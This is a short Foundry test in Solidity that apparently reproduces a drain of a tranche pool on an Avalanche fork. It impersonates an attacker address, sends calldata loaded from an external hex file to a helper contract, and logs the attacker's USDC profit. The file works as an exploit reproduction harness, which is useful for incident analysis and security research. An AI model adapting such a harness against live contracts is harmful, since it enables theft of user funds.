// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

contract TranchePoolDrainTest is Test {
    address constant ATTACKER = 0x6FF1C3Ffa622E1062168f3497a275BE9cC2b1246;
    address constant HELPER   = 0xF09DCf4EdE2a88bd316ff355dFC333A281a57805;
    address constant USDC     = 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E;
    address constant POOL     = 0xE25CB545Bdd47a8Ec2d08001cb5661B00D47621a;

    function test_drain() public {
        uint256 fork = vm.createFork("avalanche", 98731605);
        vm.selectFork(fork);

        uint256 before = IERC20(USDC).balanceOf(ATTACKER);
        console2.log("attacker USDC before:", before);

        bytes memory data = vm.parseBytes(vm.readFile("test/data/drain.hex"));

        vm.startPrank(ATTACKER);
        (bool ok, bytes memory ret) = HELPER.call(data);
        vm.stopPrank();
        console2.log("call ok:", ok);
        if (!ok) {
            console2.logBytes(ret);
        }

        uint256 afterBal = IERC20(USDC).balanceOf(ATTACKER);
        console2.log("attacker USDC after:", afterBal);
        console2.log("profit USDC (6 decimals):", afterBal - before);
        assertTrue(ok, "drain failed");
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

